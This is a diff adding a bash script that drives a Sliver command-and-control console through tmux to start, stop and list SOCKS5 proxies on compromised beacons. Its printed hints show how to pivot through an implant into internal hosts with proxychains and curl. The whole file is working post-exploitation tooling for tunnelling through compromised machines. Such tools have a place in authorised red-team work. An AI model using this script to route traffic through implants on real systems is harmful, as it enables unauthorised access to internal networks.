@@ -1,0 +1,55 @@
+#!/bin/bash
+# c2-socks - SOCKS proxy management through beacon
+# Usage:
+#   c2-socks start <beacon_id> [port=1080]
+#   c2-socks stop [beacon_id]
+#   c2-socks list
+C2="$(dirname "$0")/c2"
+ACTION="${1:-list}"
+BEACON="${2:-}"
+PORT="${3:-1080}"
+SESSION="sliver"
+
+die() { echo "[!] $*"; exit 1; }
+
+case "$ACTION" in
+    start)
+        [ -z "$BEACON" ] && die "Usage: c2-socks start <beacon_id> [port]"
+        if ! tmux has-session -t "$SESSION" 2>/dev/null; then
+            die "tmux session '$SESSION' not running"
+        fi
+        echo "[*] Starting SOCKS5 on 127.0.0.1:$PORT via beacon $BEACON..."
+        tmux send-keys -t "$SESSION" "use $BEACON" Enter ; sleep 2
+        tmux send-keys -t "$SESSION" "socks5 start --host 127.0.0.1 --port $PORT" Enter
+        sleep 3
+        echo "[*] SOCKS5 proxy started on 127.0.0.1:$PORT"
+        echo "    Use: proxychains4 -q ssh <target>"
+        echo "    Or:  curl -x socks5h://127.0.0.1:$PORT http://<internal>"
+        ;;
+    stop)
+        [ -z "$BEACON" ] && die "Usage: c2-socks stop <beacon_id>"
+        if ! tmux has-session -t "$SESSION" 2>/dev/null; then
+            die "tmux session '$SESSION' not running"
+        fi
+        echo "[*] Stopping SOCKS5 on beacon $BEACON..."
+        tmux send-keys -t "$SESSION" "use $BEACON" Enter ; sleep 2
+        tmux send-keys -t "$SESSION" "socks5 stop" Enter
+        sleep 2
+        echo "[*] SOCKS5 stopped"
+        ;;
+    list|status)
+        if tmux has-session -t "$SESSION" 2>/dev/null; then
+            tmux send-keys -t "$SESSION" "socks5" Enter
+            sleep 2
+            tmux capture-pane -t "$SESSION" -p -S -20 \
+                | perl -pe 's/\e\[[0-9;]*[a-zA-Z]//g; s/\e\][0-9;]*[^\a]*\a//g; s/\r//g' \
+                | grep -i socks
+        else
+            echo "[!] tmux session '$SESSION' not running"
+        fi
+        ;;
+    *)
+        echo "Usage: c2-socks start|stop|list [beacon_id] [port]"
+        exit 1
+        ;;
+esac
